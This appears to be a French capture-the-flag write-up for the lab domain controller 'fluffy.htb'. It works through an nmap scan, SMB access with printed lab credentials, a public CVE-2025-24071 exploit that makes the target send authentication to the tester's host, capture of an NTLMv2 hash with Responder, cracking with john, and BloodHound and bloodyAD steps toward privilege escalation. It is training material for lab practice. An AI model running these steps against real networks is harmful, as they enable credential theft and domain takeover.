
# Target : 10.129.232.88
# Creds : j.fleischman:

# Enumeration des ports et services

```js
nmap -sV -sC 10.129.232.88 -O -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 22:00 +0000
Nmap scan report for 10.129.232.88
Host is up (0.16s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-29 05:01:31Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-07-29T05:03:06+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T05:03:05+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-07-29T05:03:06+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-07-29T05:03:06+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2026-07-29T05:02:29
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.83 seconds
```

domain : 
## Enumeration smb

Conection smb anonyme authorise

![](/assets/Pasted-image-20260728220702.png)

Utilisation des creds fournis pour se connecter au partage SMB 

```js
smbclient //10.129.232.88/it --user 'j.fleischman' --password 'J0elTHEM4n1990!'
```

![](/assets/Pasted-image-20260728224210.png)

D'apres le ficher `pdf` recu nous pouvons appercevoir ce systeme est affecter par certains `cve`

![](/assets/Pasted-image-20260728230849.png)

En fesant des recherches sur chacun d'eux j'ai pu m'appercevoir que celui `CVE-2025-24071` est applicable rapidement dans notre cas ici

PoC : https://www.exploit-db.com/exploits/52310


```js
python3 explo.py -i 10.10.14.117 -n hacker -o file --keep
```

![](/assets/Pasted-image-20260728231032.png)

### Ecoute avec Responder

```js
sudo responder  -I tun0
```

![](/assets/Pasted-image-20260728231119.png)

## Creds

```js
user : p.agila 
```

```js
hash : 41a9e5d6bf0c77c6:A33F4189601655751E1052D5A88C1DDF:010100000000000000A68424E51EDD01256DD25245918C6A0000000002000800440045005500390001001E00570049004E002D00480032004C00330059003300410043004F005600540004003400570049004E002D00480032004C00330059003300410043004F00560054002E0044004500550039002E004C004F00430041004C000300140044004500550039002E004C004F00430041004C000500140044004500550039002E004C004F00430041004C000700080000A68424E51EDD010600040002000000080030003000000000000000010000000020000083F281A7B87DFC7AAA8212C4E6041242EBAEF08410BD9306743D5BB46E6CF84C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310037000000000000000000
```

```js
p.agila::FLUFFY:41a9e5d6bf0c77c6:A33F4189601655751E1052D5A88C1DDF:010100000000000000A68424E51EDD01256DD25245918C6A0000000002000800440045005500390001001E00570049004E002D00480032004C00330059003300410043004F005600540004003400570049004E002D00480032004C00330059003300410043004F00560054002E0044004500550039002E004C004F00430041004C000300140044004500550039002E004C004F00430041004C000500140044004500550039002E004C004F00430041004C000700080000A68424E51EDD010600040002000000080030003000000000000000010000000020000083F281A7B87DFC7AAA8212C4E6041242EBAEF08410BD9306743D5BB46E6CF84C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310037000000000000000000
```

### Password de agila

```js
john crackme --wordlist=/usr/share/wordlists/rockyou.txt
```

```js
prometheusx-303
```

Nous ne pourrons pas nous connecter en remote au DC

## Utilisation de Bloodhound pour enumerer les objets, ACL et trouver une liaisons entre les relations

```js
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.232.88 --dns-tcp -d fluffy.htb  -c all --zip
```

```js
bloodhound-start
```


**Énumération AD (BloodHound)** — après avoir importé les données de collecte, l'analyse du graphe révèle le chemin de privilège suivant :

```js
p.agila --(MemberOf)--> Service Account Managers --(GenericAll)--> Service Accounts --(GenericWrite)--> WinRM_SVC
```

- **`p.agila`** est membre du groupe **`Service Account Managers`**
- Ce groupe dispose du droit **`GenericAll`** (contrôle total) sur le groupe **`Service Accounts`**
- Le groupe **`Service Accounts`** dispose du droit **`GenericWrite`** sur l'utilisateur **`WinRM_SVC`**


![](/assets/Pasted-image-20260728235126.png)

### Ajout de l'user au groupe Service Accounts

```js
bloodyad -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -i 10.129.232.88 add groupMember 'Service Accounts' 'p.agila'
```

